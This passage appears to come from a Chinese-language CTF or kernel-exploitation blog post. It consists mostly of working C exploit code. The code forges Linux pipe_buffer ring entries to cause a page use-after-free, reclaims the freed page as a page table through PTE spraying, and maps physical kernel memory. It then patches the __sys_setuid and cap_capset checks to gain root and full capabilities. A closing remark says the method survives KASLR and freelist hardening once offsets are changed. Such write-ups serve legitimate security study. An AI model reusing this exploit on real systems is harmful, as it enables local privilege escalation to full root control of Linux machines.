        return EXIT_FAILURE;
    }

    context.zero_pipe_ops = LINK_ZERO_PIPE_OPS + kaslr_slide;
    fprintf(stderr,
            "[+] anon_pipe_buf_ops=%#llx, KASLR slide=%#llx, "
            "zero_pipe_buf_ops=%#llx\n",
            (unsigned long long)anon_pipe_ops,
            (unsigned long long)kaslr_slide,
            (unsigned long long)context.zero_pipe_ops);
    for (target = 0; target < PIPE_UAF_PAGES; target++)
        fprintf(stderr, "[+] pipe target page[%u]=%#llx\n", target,
                (unsigned long long)target_pages[target]);

    /* Release three pages first, then retain three no-op dangling readers. */
    memset(forged_ring, 0, sizeof(forged_ring));
    for (target = 0; target < PIPE_UAF_PAGES; target++) {
        unsigned int release_slot = 1 + target;
        unsigned int leak_slot = 1 + PIPE_UAF_PAGES + target;

        forged_ring[release_slot].page = target_pages[target];
        forged_ring[release_slot].len = PAGE_SIZE;
        forged_ring[release_slot].ops = anon_pipe_ops;

        forged_ring[leak_slot].page = target_pages[target];
        forged_ring[leak_slot].len = PAGE_SIZE;
        forged_ring[leak_slot].ops = context.zero_pipe_ops;
    }
    overwrite_pipe_ring(&context, forged_ring);

    /* Occupied tmp_page forces all three targets through put_page(). */
    read_exact(context.pipe_fd[0], pipe_input,
               PIPE_UAF_PAGES * PAGE_SIZE, "pipe page releases");

    /* Spray PTE-only file faults; any one of the three targets is sufficient. */
    fault_pte_spray();

    for (target = 0; target < PIPE_UAF_PAGES; target++) {
        unsigned int candidate_index = PAGE_SIZE / sizeof(uint64_t);
        uint64_t candidate_pte = 0;

        present_entries = 0;
        memset(page_dump, 0, sizeof(page_dump));
        read_exact(context.pipe_fd[0], page_dump, PAGE_SIZE,
                   "pipe PTE candidate leak");

        for (i = 0; i < PAGE_SIZE / sizeof(uint64_t); i++) {
            uint64_t entry;
            memcpy(&entry, page_dump + i * sizeof(uint64_t), sizeof(entry));
            if (entry & 1) {
                present_entries++;
                if (i >= 1 && i <= PTE_SPRAY_COUNT) {
                    candidate_index = i;
                    candidate_pte = entry;
                }
            }
        }

        fprintf(stderr,
                "[*] target[%u] PTE candidate: index=%u entry=%#llx "
                "present=%u\n",
                target, candidate_index,
                (unsigned long long)candidate_pte, present_entries);

        if (selected_target == PIPE_UAF_PAGES && present_entries == 1 &&
            candidate_index <= PTE_SPRAY_COUNT &&
            (candidate_pte & 0x5) == 0x5) {
            selected_target = target;
            context.pte_page = target_pages[target];
            pte_index = candidate_index;
            original_pte = candidate_pte;
            victim = pte_spray[pte_index - 1];
        }
    }

    if (selected_target == PIPE_UAF_PAGES) {
        fprintf(stderr, "[-] none of the three pipe pages became a spray PTE\n");
        best_effort_cleanup(&context, queue,
                            cleanup_queue_1, cleanup_queue_2);
        release_pte_spray();
        return EXIT_FAILURE;
    }

    fprintf(stderr,
            "[+] PTE page reclaimed: victim=%p index=%u pte=%#llx\n",
            victim, pte_index, (unsigned long long)original_pte);
    expand_victim_mapping(victim, pte_index);

    /*
     * Keep the real anonymous PTE intact.  Every physical page is installed
     * in a fresh, never-accessed slot of this same PTE page, which avoids TLB
     * flushes and prevents mprotect() from accounting kernel PFNs as user RSS.
     */
    context.first_map_index = pte_index + 1;
    context.next_map_index = context.first_map_index;
    mapping_pte = original_pte | 0x2ULL;
    physical_text = find_physical_kernel_base(&context, victim, mapping_pte);

    setuid_physical = physical_text + SETUID_BRANCH_OFFSET;
    setuid_mapping = map_physical_page(&context, victim, mapping_pte,
                                       setuid_physical & ~(PAGE_SIZE - 1));
    setuid_mapping += setuid_physical & (PAGE_SIZE - 1);

    fprintf(stderr,
            "[+] __sys_setuid permission branch physical=%#llx bytes=%02x %02x\n",
            (unsigned long long)setuid_physical,
            setuid_mapping[0], setuid_mapping[1]);

    if (memcmp(setuid_mapping, original_branch,
               sizeof(original_branch)) != 0) {
        fprintf(stderr, "[-] unexpected __sys_setuid patch bytes\n");
    } else {
        memcpy(setuid_mapping, bypass_branch, sizeof(bypass_branch));
        __sync_synchronize();

        errno = 0;
        if (syscall(SYS_setuid, 0) == 0 && getuid() == 0 && geteuid() == 0) {
            privilege_ok = 1;
            fprintf(stderr, "[+] setuid(0) succeeded\n");
        } else {
            fprintf(stderr, "[-] setuid(0) failed: %s\n", strerror(errno));
        }

        memcpy(setuid_mapping, original_branch, sizeof(original_branch));
        __sync_synchronize();
    }

    if (privilege_ok) {
        capset_physical = physical_text + CAP_CAPSET_PATCH_OFFSET;
        capset_mapping = map_physical_page(&context, victim, mapping_pte,
                                           capset_physical & ~(PAGE_SIZE - 1));
        capset_mapping += capset_physical & (PAGE_SIZE - 1);

        fprintf(stderr,
                "[+] cap_capset check block physical=%#llx "
                "bytes=%02x %02x %02x %02x %02x\n",
                (unsigned long long)capset_physical,
                capset_mapping[0], capset_mapping[1], capset_mapping[2],
                capset_mapping[3], capset_mapping[4]);

        if (memcmp(capset_mapping, original_capset,
                   sizeof(original_capset)) != 0) {
            fprintf(stderr, "[-] unexpected cap_capset patch bytes\n");
            privilege_ok = 0;
        } else {
            memset(&capability_header, 0, sizeof(capability_header));
            memset(capability_data, 0, sizeof(capability_data));
            capability_header.version = _LINUX_CAPABILITY_VERSION_3;
            capability_header.pid = 0;
            capability_data[0].effective = 0xffffffffU;
            capability_data[0].permitted = 0xffffffffU;
            capability_data[1].effective = 0x1ffU;
            capability_data[1].permitted = 0x1ffU;

            memcpy(capset_mapping, bypass_capset, sizeof(bypass_capset));
            __sync_synchronize();
            errno = 0;
            if (syscall(SYS_capset, &capability_header,
                        capability_data) < 0) {
                fprintf(stderr, "[-] capset failed: %s\n", strerror(errno));
                privilege_ok = 0;
            } else {
                fprintf(stderr, "[+] full root capabilities installed\n");
            }
            memcpy(capset_mapping, original_capset,
                   sizeof(original_capset));
            __sync_synchronize();
        }
    }

    /* Report the flag before teardown so a cleanup regression cannot hide it. */
    if (privilege_ok)
        flag_ok = print_flag() == 0;

    /* Remove all manually inserted PTEs before the kernel tears down the mm. */
    clear_physical_mappings(&context);
    release_pte_spray();

    best_effort_cleanup(&context, queue, cleanup_queue_1, cleanup_queue_2);
    return privilege_ok && flag_ok ? EXIT_SUCCESS : EXIT_FAILURE;
}

```



## 5.7 kaslr + randomized freelist + HARDENED freelist + 不具备读能力 + Hardened Usercopy：提权<br>
上述方法依然有用，就是linux内核偏移变更需要改一些常量<br>





<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>